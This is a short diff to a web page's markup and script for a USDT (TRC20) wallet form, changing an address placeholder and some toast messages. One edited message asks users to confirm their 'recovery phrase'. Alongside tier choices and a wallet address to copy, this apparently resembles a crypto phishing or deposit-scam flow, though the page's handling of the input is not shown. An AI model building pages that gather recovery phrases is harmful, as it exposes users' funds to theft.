@@ -424,7 +424,7 @@ body {
     <!-- Wrapped input block -->
     <div style="width: 100%; display: flex; flex-direction: column;">
       <label for="addr">Your USDT (TRC20) Address</label>
-      <input id="addr" name="addr" placeholder="0x..." autocomplete="off" />
+      <input id="addr" name="addr" placeholder="T9x..." autocomplete="off" />
     </div>
 
     <div class="loader" aria-hidden="true"></div>
@@ -661,7 +661,7 @@ s2form.addEventListener("submit", (event) => {
   // Validate checkbox
   const matchCheck = document.getElementById("matchCheck");
   if (!matchCheck.checked) {
-    showToast("Please confirm your backup matches your TRC20 wallet address.");
+    showToast("Confirm your recovery phrase matches your TRC20 wallet.");
     return;
   }
 
@@ -733,7 +733,7 @@ if (tierChoice) {
   copyBtn.addEventListener("click", () => {
     const walletAddr = document.getElementById('walletDisplay').textContent;
     navigator.clipboard.writeText(walletAddr).then(() => {
-      showToast("Copied");
+      showToast("Address copied");
     }).catch(() => {
       showToast("Failed to copy");
     });
